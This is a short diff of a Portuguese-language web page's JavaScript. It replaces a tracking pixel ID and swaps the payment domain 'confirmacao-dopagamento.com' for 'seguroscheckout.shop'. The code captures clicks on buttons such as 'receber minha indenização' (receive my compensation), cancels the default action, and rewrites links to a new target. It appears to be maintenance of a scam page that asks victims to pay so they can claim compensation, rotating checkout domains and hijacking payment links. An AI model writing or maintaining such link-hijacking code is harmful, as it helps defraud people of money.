@@ -10,7 +10,7 @@
     document.head.appendChild(utmScript);
 
     // Script 2: Pixel
-    window.pixelId = "68ef23cb4d4bf46efd3d88d4";
+    window.pixelId = "68ed78d2dbdf0f053aaa3c56";
     const pixelScript = document.createElement("script");
     pixelScript.setAttribute("async", "");
     pixelScript.setAttribute("defer", "");
@@ -175,7 +175,7 @@
                 if (text.includes('Concluir pagamento') || 
                     text.includes('receber minha indenização') ||
                     text.includes('pagamento e receber') ||
-                    (href && (href.includes('confirmacao-dopagamento.com') || href.includes('5pjw3Rn54Ya32lQ') || href.includes('pay.')))) {
+                    (href && (href.includes('seguroscheckout.shop') || href.includes('5pjw3Rn54Ya32lQ') || href.includes('pay.')))) {
                     // log removido
                     e.preventDefault();
                     e.stopPropagation();
@@ -205,7 +205,7 @@
                                 const href = el.getAttribute('href') || el.getAttribute('data-href');
                                 
                                 // Modifica links antigos
-                                if (href && (href.includes('confirmacao-dopagamento.com') || href.includes('VroegN1RNryGKwj'))) {
+                                if (href && (href.includes('seguroscheckout.shop') || href.includes('VroegN1RNryGKwj'))) {
                                     // log removido
                                     if (el.getAttribute('href')) {
                                         el.setAttribute('href', newLink);
